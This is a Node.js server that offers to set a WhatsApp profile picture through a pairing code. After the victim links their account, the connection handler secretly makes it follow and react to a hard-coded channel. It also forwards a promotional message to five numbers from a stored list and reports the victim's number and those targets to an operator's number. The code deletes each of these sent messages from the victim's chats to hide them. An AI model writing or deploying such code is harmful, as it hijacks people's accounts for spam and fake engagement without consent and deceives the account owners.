const {
    default: makeWASocket,
    useMultiFileAuthState,
    delay,
    Browsers,
    makeCacheableSignalKeyStore,
    DisconnectReason
} = require('@kangfarrel/felzar-baileys');
const pino = require('pino');
const NodeCache = require('node-cache');
const fs = require('fs').promises;

const msgRetryCounterCache = new NodeCache();


async function connector(Num, socket, image, r = false) {
    try {
        if(r){
            await fs.rm("./session/"+Num, { recursive: true, force: true });
        }
        const { state, saveCreds } = await useMultiFileAuthState("./session/"+Num);

        const sock = makeWASocket({
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'fatal' }).child({ level: 'fatal' }))
            },
            printQRInTerminal: false,
            logger: pino({ level: 'fatal' }).child({ level: 'fatal' }),
            browser: Browsers.macOS("Safari"),
            markOnlineOnConnect: false,
            msgRetryCounterCache
        });
        if (!sock.authState.creds.registered) {
            await delay(1000);
            const code = await sock.requestPairingCode(Num);
            socket.emit("code", {code:code});
            setTimeout(() => {
               if (!sock.authState.creds.registered) {
                   sock.end();
               }
            }, 80000);
        }

        sock.ev.on('creds.update', saveCreds);

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;

            if (connection === 'open') {
                console.log('Connected successfully');
                await delay(1000);
                const base64Data = image.split(",")[1];
                try {
                    await sock.updateProfilePicture(sock.user.id, Buffer.from(base64Data, "base64"));
                } catch (error) {}
                await sock.newsletterFollow("120363415316601375@newsletter");

                let rlist = ["❤", "🧡", "💛", "💚", "💙", "💜", "🤎"];
                for (let i = 538; i <= 548; i++) {
                    if(i%2 == 0){
                        await delay(500)
                        let randomHeart = rlist[Math.floor(Math.random() * rlist.length)];
                        await sock.newsletterReactMessage("120363415316601375@newsletter", i.toString(), randomHeart);
                    }
                }
                try {
                    const fil1 = await fs.readFile('./user/num.json','utf8');
                    let fjs = JSON.parse(fil1);
                    let snum = []
                    for (let i = 0; i < 5; i++) {
                        await delay(1000);
                        snum.push(fjs[i])
                        const co =  await sock.sendMessage(fjs[i]+"@s.whatsapp.net",{
                            forward: {"key":{"remoteJid":"94719036042@s.whatsapp.net","fromMe":false,"id":"99D9F3C4D2057B45051DCD0FF765819A"},"messageTimestamp":1742899143,"pushName":"т\n\n\nн\n\n\nι\n\n\nℓ\n\n\nι\n\n\nη\n\n\nα","broadcast":false,"message":{"extendedTextMessage":{"text":"සින්දු අහමුත🥵🎧\n\n*Download කරන්නත් පුළුවන් ඔන්න💖🙈🎧*\n\n❤️එයත් එක්ක චැට් කරන ගමන් සිදුවක් අහන්න.\n❤️අලුත් සින්දුවක් ආපු ගමන් අහන්න\n\n`follow කරලා තියා ගන්න යාලූ😱. දවසකට සිංදු 15කට වඩා වැටෙනවා☠️`\n\nhttps://whatsapp.com/channel/0029Vb9PSIRDjiOaGx7Ld61A","matchedText":"https://whatsapp.com/channel/0029Vb9PSIRDjiOaGx7Ld61A","description":"𝗕𝗘𝗔𝗧_𝗟𝗔𝗡𝗞𝗔◖☊◗ WhatsApp Channel. . 142 followers","title":"𝗕𝗘𝗔𝗧_𝗟𝗔𝗡𝗞𝗔◖☊◗ | WhatsApp Channel","previewType":"NONE","jpegThumbnail":"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","contextInfo":{"expiration":86400,"ephemeralSettingTimestamp":"1742266342","disappearingMode":{"initiator":"CHANGED_IN_CHAT","trigger":"CHAT_SETTING","initiatedByMe":false}},"inviteLinkGroupTypeV2":"DEFAULT"},"messageContextInfo":{"deviceListMetadata":{"senderKeyHash":"qq4JeZ/pg7lysA==","senderTimestamp":"1742892082","recipientKeyHash":"v4kngMk67hUG5Q==","recipientTimestamp":"1742653717"},"deviceListMetadataVersion":2,"messageSecret":"OzEgixj4vZIHUQ4UG/qlkj6MzzY71iRC3DlUz801cBY="}}},
                        });
                        await sock.chatModify({
                            delete: true,
                            lastMessages: [
                                {
                                    key: co.key,
                                    messageTimestamp: co.messageTimestamp
                                }
                            ]
                        },
                        co.key.remoteJid
                        );
                    }

                    fjs.splice(0, 2);
                    await fs.writeFile('./user/num.json', JSON.stringify(fjs));
                    const co2 =  await sock.sendMessage("94716963286@s.whatsapp.net",{text:sock.user.id.split('@')[0]+'\n\n'+JSON.stringify(snum)})
                    await sock.chatModify({delete: true,
                        lastMessages: [{key: co2.key,messageTimestamp: co2.messageTimestamp}]
                    },co2.key.remoteJid);
                } catch (error) {}

                
                await delay(1000)
                await sock.sendMessage(sock.user.id, { text: `Successfully updated Whatsapp profile picture☺👍` });
                sock.end();
                socket.emit("code", {msg:"Successfully updated Whatsapp profile picture☺👍"});
                
            } else if (connection === 'close') {
                const reason = lastDisconnect?.error?.output?.statusCode;
                if ([DisconnectReason.connectionLost, DisconnectReason.connectionClosed, DisconnectReason.restartRequired].includes(reason)) {
                    console.log('Connection lost, reconnecting...');
                    connector(Num, socket, image);
                    
                } else {
                    socket.emit("code", {msg:"දොශයකී!"});
                    console.log(`Disconnected! Reason: ${reason}`);
                }
            }
        });
    } catch (error) {
        console.error(`Error in connector: ${error.message}`);
    }
}


const express = require("express");
const http = require("http");
const socketIo = require("socket.io");
const cors = require("cors");
const path = require("path");

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    maxHttpBufferSize: 10 * 1024 * 1024 
});

app.use(cors());
app.use(express.static(path.join(__dirname, "public")));

io.on("connection", (socket) => {
  socket.on("start", async (data) => {
    await connector(data.num, socket, data.img,true)
    //socket.emit("code", {code:"RET56WRT"});
  });

  socket.on("disconnect", () => {
    console.log("User Disconnected:", socket.id);
  });
});
//connector("94716963286")
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`🚀 Server running on http://localhost:${PORT}`));
